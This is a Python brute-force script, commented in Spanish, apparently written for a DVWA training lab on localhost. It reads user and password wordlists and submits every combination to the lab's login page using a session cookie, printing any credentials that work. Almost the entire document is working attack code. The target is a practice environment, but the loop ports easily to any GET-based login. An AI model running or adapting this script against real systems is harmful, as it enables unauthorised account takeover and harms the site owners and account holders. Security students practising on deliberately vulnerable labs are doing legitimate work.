import requests

# --- Configuración ---
URL = "http://localhost:4280/vulnerabilities/brute/"
usuarios_file = "/home/user/Escritorio/lab2/users.txt"
passwords_file = "/home/user/Escritorio/lab2/passwords.txt"
SUCCESS_TEXT = "Welcome to the password protected area"

COOKIE = {
    "security": "low",
    "PHPSESSID": "731d5d72ccb8f1bddf68727567e279df"
}

# --- Lógica del Ataque ---
def main():
    print("[-] Iniciando ataque de fuerza bruta...")

    with open(usuarios_file) as u:
        usuarios = u.read().splitlines()

    with open(passwords_file) as p:
        passwords = p.read().splitlines()

    for usuario in usuarios:
        for password in passwords:
            print(f"[.] Probando: {usuario}:{password}")

            # Preparamos los datos que enviaremos
            params = {
                "username": usuario,
                "password": password,
                "Login": "Login"
            }

            # Hacemos la petición GET con los parámetros y la cookie de sesión
            response = requests.get(URL, params=params, cookies=COOKIE)

            # Verificamos si la respuesta contiene el texto de éxito
            if SUCCESS_TEXT in response.text:
                print(f"[+] ¡ÉXITO! Credenciales encontradas: {usuario}:{password}")

    print("[-] Ataque finalizado.")

if __name__ == "__main__":
    main()
